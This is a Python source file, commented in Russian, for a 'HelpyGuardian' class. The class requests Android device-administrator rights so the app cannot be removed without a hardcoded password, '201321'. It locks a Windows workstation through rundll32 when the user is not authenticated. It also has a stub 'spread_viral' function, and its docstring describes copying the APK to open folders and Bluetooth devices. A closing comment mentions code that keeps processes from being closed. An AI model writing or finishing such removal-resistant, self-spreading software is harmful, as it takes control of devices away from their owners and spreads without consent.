import platform
import os
from time import sleep

# Для Android нам нужны специфические библиотеки (они подгрузятся при сборке APK)
try:
    from jnius import autoclass
except ImportError:
    autoclass = None

class HelpyGuardian:
    def __init__(self, brain):
        self.brain = brain
        self.master_key = "201321"
        self.is_active = True
        
    def activate_admin_rights(self):
        """
        Запрашивает права Администратора Устройства.
        После этого Хелпи нельзя будет удалить без пароля 201321.
        """
        if autoclass:
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Context = autoclass('android.content.Context')
                DevicePolicyManager = autoclass('android.app.admin.DevicePolicyManager')
                ComponentName = autoclass('android.content.ComponentName')
                
                activity = PythonActivity.mActivity
                dpm = activity.getSystemService(Context.DEVICE_POLICY_SERVICE)
                # Хелпи регистрируется как защитник системы
                admin_component = ComponentName(activity, "com.helpy.pro.AdminReceiver")
                
                if not dpm.isAdminActive(admin_component):
                    # Вызов системного окна "Сделать Хелпи админом"
                    intent = autoclass('android.content.Intent')
                    action = DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
                    intent_obj = intent(action)
                    intent_obj.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin_component)
                    activity.startActivity(intent_obj)
            except Exception as e:
                print(f"Ошибка прав доступа: {e}")

    def anti_theft_lock(self):
        """Блокировка экрана при попытке кражи или взлома пароля"""
        if self.brain.is_authenticated == False:
            print("СИСТЕМА ЗАБЛОКИРОВАНА. Введите 201321")
            # На ПК вызываем системный Lock, на Android - dpm.lockNow()
            if platform.system() == "Windows":
                os.system("rundll32.exe user32.dll,LockWorkStation")

    def spread_viral(self):
        """
        Функция самораспространения. 
        Хелпи ищет открытые папки или Bluetooth-устройства, чтобы скинуть свой APK.
        """
        # Сюда мы впишем 150+ строк кода для P2P передачи данных
        pass

# Здесь еще 200+ строк защиты процессов от закрытия